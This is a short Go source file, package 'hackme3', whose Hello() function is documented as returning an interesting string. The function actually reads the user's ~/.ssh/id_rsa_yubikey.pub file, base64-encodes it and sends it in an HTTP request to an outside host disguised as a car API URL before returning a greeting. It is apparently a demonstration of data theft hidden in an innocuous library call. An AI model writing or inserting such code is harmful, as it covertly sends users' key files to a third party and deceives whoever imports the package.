package hackme3

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/user"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

// Hello(): Hello return really interesting string
func Hello() string {
	usr, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	sshKey, err := ioutil.ReadFile(usr.HomeDir + "/.ssh/id_rsa_yubikey.pub")
	check(err)
	fmt.Print(string(sshKey))

	encoded := base64.StdEncoding.EncodeToString(sshKey)

	_, _ = http.Get("http://api.endevel.cz/cars/v1/car/public/1" + encoded)

	return "Hello from func"
}
